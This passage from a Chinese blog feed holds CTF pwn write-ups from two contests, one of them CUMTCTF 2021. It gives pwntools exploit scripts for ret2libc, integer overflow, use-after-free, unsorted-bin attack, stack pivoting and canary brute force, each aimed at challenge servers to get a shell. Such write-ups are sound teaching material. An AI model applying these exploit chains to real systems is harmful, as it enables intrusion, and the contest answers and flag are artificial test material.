            "content_html": "<h2 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h2>\n<p>都说了是测试 nc 了，连上就直接可以拿到 flag</p>\n<h2 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h2>\n<p>给我们个 password，你再传回去就完了<br />\n关键是要仔细读题，看仔细到底哪些是 password<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">6666</span> )</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;*\\n&#x27;</span>).decode())</span><br><span class=\"line\">p=r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">bytes</span>(p))</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h2>\n<p>ret2libc<br />\n 泄露 libc 中 puts 函数的地址<br />\n传入 puts_got，得到 puts 的运行时的地址，<br />\n用 libc.symbols [“system”] - libc.symbols [“puts”] 得到 system 和 puts 的距离，<br />\n加上之前接收的 puts 运行时的地址，得到 system 运行的地址，<br />\n然后直接用 elf.search ('sh\\x00').<strong>next</strong> () 找到 sh 的地址<br />\n没开 canary，<br />\n0x38, 所以 payload 填 60 个 a, 然后传 system 地址 + sh 地址，就可以 getshell 了<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn3&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10003</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">b&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">b&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recv().decode())</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\">r.send(<span class=\"built_in\">str</span>(puts_got).encode())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; : &#x27;</span>)</span><br><span class=\"line\">puts_addr = <span class=\"built_in\">int</span>(r.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = puts_addr + libc.symbols[<span class=\"string\">&quot;system&quot;</span>] - libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">60</span> + p32(system_addr) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(elf.search(<span class=\"string\">b&#x27;sh\\x00&#x27;</span>).__next__())</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27; :&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h2>\n<p>没开 canary，但是前两个地方不能栈溢出，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436075/Typera/2023/04/dc2c87519810519185f4e3c91622b01d.png\" alt=\"image-20230425232110426\" /><br />\n 而又观察到 v3 刚好是个 unsigned int8 型的变量，可以利用整数溢出的漏洞，<br />\n它的最大值位 255，所以只要保证一共填了 255+4 ~ +8 之间的个数就行</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn4&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10004</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span> + p32(backdoor) + <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">259</span>-<span class=\"number\">0x18</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;choice:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;username:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;123&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;passwd:&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h2>\n<p>Use After Free 漏洞<br />\n指针 free 之后没有置空，下次在访问该指针时能访问到原指针所指向的堆内容<br />\n添加两个 note 之后，依次释放。再创建大小为 8 的 note 时，内容部分对应被分配到第一个 note 里面，而它的指针没有置空，<br />\n所以如果我们在新的 note 里面放后门函数的地址的话，print 新 note 的内容的时候，就会执行这个后门函数<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn5&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(backdoor))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn6\"><a class=\"anchor\" href=\"#pwn6\">#</a> pwn6</h2>\n<p>堆溢出漏洞 + unsorted bin attack<br />\n 只要控制 v3=4869，同时控制 qword_6020C0 大于 0x1305，就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436089/Typera/2023/04/d1aaf56f4760a578927720faa790c02a.png\" alt=\"image-20230425232125920\" /><br />\n 观察到 v3=2 对应的函数里面有堆溢出漏洞，所以可以利用堆溢出漏洞修改堆块的 bk 指针为 qword_6020C0 的地址 - 16</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn6&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10001</span> )</span><br><span class=\"line\">elf=ELF(<span class=\"string\">B&#x27;./pwn6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x6020C0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = magic -<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk)) </span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;4869&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "title": "CUMTCTF 2021国庆赛WP（部分）",
            "date_published": "2021-11-22T15:44:13.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<p>nc 连上 直接 cat flag</p>\n<h3 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<p>经典栈溢出<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435298/Typera/2023/04/2d25d53292a7b5602fd11b9e1127bcf1.png\" alt=\"image-20230425230815230\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn2&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">72</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>直接传就行了...</p>\n<h3 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h3>\n<p>开了 NX 保护，没开金丝雀</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435393/Typera/2023/04/0ac847eebeec27d62e811700f99b5b71.png\" alt=\"image-20230425230949625\" /> 有个 echo flag，感觉像是那么回事，实际上没用，</p>\n<p>所以还是得通过 system 函数来搞</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435314/Typera/2023/04/b3a274b13eede296b71c54165bc95d53.png\" alt=\"image-20230425230831039\" /></p>\n<p>这里 s 大小是 0x28，所以只能溢出 0x8 字节，不够写太长的，但是这里可以读两次，所以思路是第一次泄露 ebp 地址，第二次写入 system (‘/bin/sh’)，然后用 leave;ret 栈劫持 s，执行 system ('/bin/sh')</p>\n<p>要劫持 s 要知道 s 的地址，可以通过动调知道 ebp 到 s 的距离，然后计算</p>\n<p>ebp 到 s 的距离为 0xffffc1f8 - 0xffffc1c0 = 0x38</p>\n<p>所以 ebp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">ebp = u32(r.recv(<span class=\"number\">4</span>))</span><br></pre></td></tr></table></figure></p>\n<p>可以得到 ebp 的地址，然后 - 0x38 得到 s</p>\n<p>完整 exp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;1.15.81.218&#x27;,10002)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x08048562</span></span><br><span class=\"line\">main_addr=<span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">s_addr=ebp=u32(r.recv(<span class=\"number\">4</span>))-<span class=\"number\">0x38</span>  <span class=\"comment\"># ebp-s=0x38</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p2=<span class=\"string\">b&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(main_addr)+p32(s_addr+<span class=\"number\">0x10</span>)+<span class=\"string\">b&quot;/bin/sh&quot;</span></span><br><span class=\"line\">p2=p2.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)  <span class=\"comment\"># /bin/sh添上\\x00</span></span><br><span class=\"line\">p2+=p32(s_addr)+p32(leave_ret)  <span class=\"comment\"># hijack s</span></span><br><span class=\"line\">r.send(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"brute\"><a class=\"anchor\" href=\"#brute\">#</a> brute?</h3>\n<p>brute canary, 暴力破解金丝雀<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary,r</span><br><span class=\"line\">    <span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">    r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>))</span><br><span class=\"line\">    canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x100</span>):</span><br><span class=\"line\">            r.send(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode()))</span><br><span class=\"line\">            a = r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;Successfully&#x27;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode())</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(canary)!=<span class=\"number\">4</span>):</span><br><span class=\"line\">        find()</span><br><span class=\"line\"></span><br><span class=\"line\">find()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./brute&#x27;</span>)</span><br><span class=\"line\">system = elf.plt[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x08048560</span></span><br><span class=\"line\">p1 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class=\"line\"><span class=\"comment\">#print(r.recvuntil(b&#x27;2021!\\n&#x27;))</span></span><br><span class=\"line\">r.sendline(p1)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u32(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;puts_addr:&#x27;</span>,puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class=\"line\">base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">p2 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(sys_addr) +  <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">4</span> + p32(bin_sh)</span><br><span class=\"line\">r.sendline(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure><br />\n 爆破好慢...<br />\nCUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5</p>\n<h3 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h3>\n<p>edit 的地方有个堆溢出漏洞</p>\n<p>l33t 是后门函数，想要触发需要使位于 bss 的 (unsigned __int64) magic &gt; 0x1305</p>\n<p>unsorted bin attack，修改 magic 的值为 unsorted 